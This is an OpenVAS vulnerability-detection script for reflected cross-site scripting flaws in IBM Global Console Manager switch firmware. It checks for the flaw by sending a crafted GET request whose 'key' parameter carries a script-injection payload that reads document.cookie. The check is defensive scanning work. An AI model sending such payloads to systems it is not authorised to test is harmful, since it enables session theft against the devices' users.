###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ibm_global_console_manager_mult_xss_vuln.nasl 11974 2018-10-19 06:22:46Z cfischer $
#
# IBM Global Console Manager switches Multiple XSS Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804775");
  script_version("$Revision: 11974 $");
  script_cve_id("CVE-2014-3080", "CVE-2014-3081", "CVE-2014-3085");
  script_bugtraq_id(68777, 68779, 68939);
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:22:46 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-10-13 16:48:44 +0530 (Mon, 13 Oct 2014)");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_name("IBM Global Console Manager switches Multiple XSS Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with IBM Global
  Console Manager switches and is prone to multiple xss vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to improper sanitization of
  user-supplied input passed via 'query' parameter to kvm.cgi and 'key'
  parameter to avctalert.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.");

  script_tag(name:"affected", value:"IBM GCM16 and GCM32 Global Console Manager
  switches with firmware before 1.20.20.23447");

  script_tag(name:"solution", value:"Update to firmware version 1.20.20.23447 or newer.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34132");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jul/113");
  script_xref(name:"URL", value:"http://www.ibm.com/support/entry/portal/docdisplay?lndocid=migr-5095983");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 443);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:443);

rcvRes = http_get_cache(item:"/login.php", port:http_port);

if(">GCM" >< rcvRes)
{
  url = "/avctalert.php?key=<script>alert(document.cookie)</script>";

  sndReq = http_get(item:url, port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(rcvRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< rcvRes)
  {
    security_message(port:http_port);
    exit(0);
  }
}

exit(99);
